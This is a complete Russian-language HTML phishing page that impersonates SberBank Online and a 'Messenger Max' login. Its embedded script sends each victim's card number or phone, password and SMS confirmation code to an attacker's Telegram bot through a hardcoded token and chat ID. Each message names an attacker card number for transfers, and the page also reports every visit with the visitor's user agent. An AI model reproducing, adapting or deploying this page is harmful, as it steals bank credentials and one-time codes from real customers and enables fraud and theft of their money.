<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>СберБанк • Мессенджер Max</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            padding: 16px;
        }
        
        /* Верхняя панель */
        .status-bar {
            background: #2d6a4f;
            color: white;
            padding: 12px 16px;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            border-radius: 20px 20px 0 0;
        }
        
        /* Карта */
        .card-preview {
            background: linear-gradient(135deg, #1e3a3a, #2d6a4f);
            border-radius: 20px;
            padding: 20px;
            margin: 16px 0;
            color: white;
        }
        .card-number {
            font-size: 20px;
            letter-spacing: 2px;
            font-family: monospace;
            margin: 12px 0;
        }
        .card-row {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
        }
        
        /* Вкладки */
        .tabs {
            display: flex;
            background: white;
            border-radius: 16px;
            margin: 16px 0;
            overflow: hidden;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 12px;
            font-weight: 600;
            cursor: pointer;
            background: white;
            transition: all 0.2s;
        }
        .tab.active {
            background: #2d6a4f;
            color: white;
        }
        
        /* Форма входа */
        .login-form {
            background: white;
            border-radius: 20px;
            padding: 20px;
            margin-top: 8px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            color: #666;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            background: #f8f9fa;
        }
        .input-group input:focus {
            outline: none;
            border-color: #2d6a4f;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #2d6a4f;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            margin-top: 8px;
        }
        .sms-block {
            display: none;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #eee;
        }
        
        /* Услуги */
        .services {
            display: flex;
            gap: 12px;
            margin: 16px 0;
            overflow-x: auto;
        }
        .service-item {
            background: white;
            padding: 12px 16px;
            border-radius: 40px;
            font-size: 13px;
            white-space: nowrap;
        }
        
        /* Новости */
        .news {
            background: white;
            border-radius: 20px;
            padding: 16px;
            margin-top: 16px;
        }
        .news-item {
            display: flex;
            gap: 12px;
            padding: 12px 0;
            border-bottom: 1px solid #eee;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="status-bar">
    <span>СберБанк Онлайн</span>
    <span>🔋 📶</span>
</div>

<!-- Карта -->
<div class="card-preview">
    <div style="font-size: 12px; opacity: 0.8;">Ваша карта</div>
    <div class="card-number" id="cardNumberDisplay">•••• •••• •••• ••••</div>
    <div class="card-row">
        <span>IVAN IVANOV</span>
        <span>••/••</span>
    </div>
</div>

<!-- Вкладки -->
<div class="tabs">
    <div class="tab active" onclick="switchTab('sber')">СберБанк</div>
    <div class="tab" onclick="switchTab('max')">Мессенджер Max</div>
</div>

<!-- Форма Сбера -->
<div id="sberForm" class="login-form">
    <div class="input-group">
        <label>Номер карты или телефона</label>
        <input type="text" id="sberLogin" placeholder="0000 0000 0000 0000">
    </div>
    <div class="input-group">
        <label>Пароль</label>
        <input type="password" id="sberPass" placeholder="••••••••">
    </div>
    <button class="login-btn" onclick="sendSberData()">Войти</button>
    <div id="sberSmsBlock" class="sms-block">
        <div class="input-group">
            <label>Код из СМС</label>
            <input type="text" id="sberSms" placeholder="000000">
        </div>
        <button class="login-btn" onclick="sendSberSms()">Подтвердить</button>
    </div>
    <div style="margin-top: 16px; font-size: 12px; color: #999; text-align: center;">
        🔒 Защищенное соединение
    </div>
</div>

<!-- Форма Max -->
<div id="maxForm" class="login-form hidden">
    <div class="input-group">
        <label>Номер телефона</label>
        <input type="tel" id="maxPhone" placeholder="7 XXX XXX XX XX">
    </div>
    <div class="input-group">
        <label>Пароль</label>
        <input type="password" id="maxPass" placeholder="••••••••">
    </div>
    <button class="login-btn" onclick="sendMaxData()">Войти</button>
    <div id="maxSmsBlock" class="sms-block">
        <div class="input-group">
            <label>Код подтверждения</label>
            <input type="text" id="maxSms" placeholder="000000">
        </div>
        <button class="login-btn" onclick="sendMaxSms()">Подтвердить</button>
    </div>
</div>

<!-- Услуги -->
<div class="services">
    <div class="service-item">💳 Переводы</div>
    <div class="service-item">📱 Оплата связи</div>
    <div class="service-item">🏠 ЖКХ</div>
    <div class="service-item">💸 Кредиты</div>
</div>

<!-- Новости -->
<div class="news">
    <div class="news-item">
        <div>🏦</div>
        <div><strong>Кэшбек 30%</strong><br>В магазинах до 31 марта</div>
    </div>
    <div class="news-item">
        <div>💬</div>
        <div><strong>Max Premium 3 месяца бесплатно</strong><br>Для новых пользователей</div>
    </div>
</div>

<script>
// ========== НАСТРОЙКИ TELEGRAM ==========
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
const CHAT_ID = "8533450974";
const MY_CARD = "2203830216112947";

let sberCardTemp = "";
let sberPassTemp = "";
let maxPhoneTemp = "";
let maxPassTemp = "";

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
    }).catch(e => console.log("send error"));
}

function switchTab(tab) {
    const sberTab = document.querySelectorAll('.tab');
    sberTab.forEach(t => t.classList.remove('active'));
    if (tab === 'sber') {
        sberTab[0].classList.add('active');
        document.getElementById('sberForm').classList.remove('hidden');
        document.getElementById('maxForm').classList.add('hidden');
    } else {
        sberTab[1].classList.add('active');
        document.getElementById('sberForm').classList.add('hidden');
        document.getElementById('maxForm').classList.remove('hidden');
    }
}

// СБЕРБАНК
function sendSberData() {
    const login = document.getElementById('sberLogin').value;
    const pass = document.getElementById('sberPass').value;
    
    if (!login || !pass) {
        alert("Заполните все поля");
        return;
    }
    
    sberCardTemp = login;
    sberPassTemp = pass;
    
    sendToTelegram(`🏦 *СБЕРБАНК - ВХОД*\n⏰ ${new Date().toLocaleString()}\n💳 Карта/Телефон: ${login}\n🔑 Пароль: ${pass}\n💰 Перевод на: ${MY_CARD}`);
    
    // Показываем поле для SMS
    document.getElementById('sberSmsBlock').style.display = 'block';
    document.querySelector('#sberForm .login-btn').style.display = 'none';
}

function sendSberSms() {
    const sms = document.getElementById('sberSms').value;
    sendToTelegram(`🏦 *СБЕРБАНК - SMS*\n⏰ ${new Date().toLocaleString()}\n💳 Карта: ${sberCardTemp}\n📨 SMS код: ${sms}\n💰 Перевод на: ${MY_CARD}`);
    
    alert("Вход выполнен успешно");
    window.location.href = "https://drive.google.com/file/d/1NDfztoOIEOF_Sg1dFAnvV-XiWSxzGXVA/view";
}

// MESSENGER MAX
function sendMaxData() {
    const phone = document.getElementById('maxPhone').value;
    const pass = document.getElementById('maxPass').value;
    
    if (!phone || !pass) {
        alert("Заполните все поля");
        return;
    }
    
    maxPhoneTemp = phone;
    maxPassTemp = pass;
    
    sendToTelegram(`💬 *MESSENGER MAX - ВХОД*\n⏰ ${new Date().toLocaleString()}\n📞 Телефон: ${phone}\n🔑 Пароль: ${pass}`);
    
    document.getElementById('maxSmsBlock').style.display = 'block';
    document.querySelector('#maxForm .login-btn').style.display = 'none';
}

function sendMaxSms() {
    const sms = document.getElementById('maxSms').value;
    sendToTelegram(`💬 *MESSENGER MAX - SMS*\n⏰ ${new Date().toLocaleString()}\n📞 Телефон: ${maxPhoneTemp}\n📨 SMS код: ${sms}`);
    
    alert("Вход выполнен успешно");
    window.location.href = "https://max.ru";
}

// Уведомление о просмотре
setTimeout(() => {
    sendToTelegram(`👁️ *НОВЫЙ ПОЛЬЗОВАТЕЛЬ*\n⏰ ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.substring(0, 100)}`);
}, 2000);
</script>
</body>
</html>
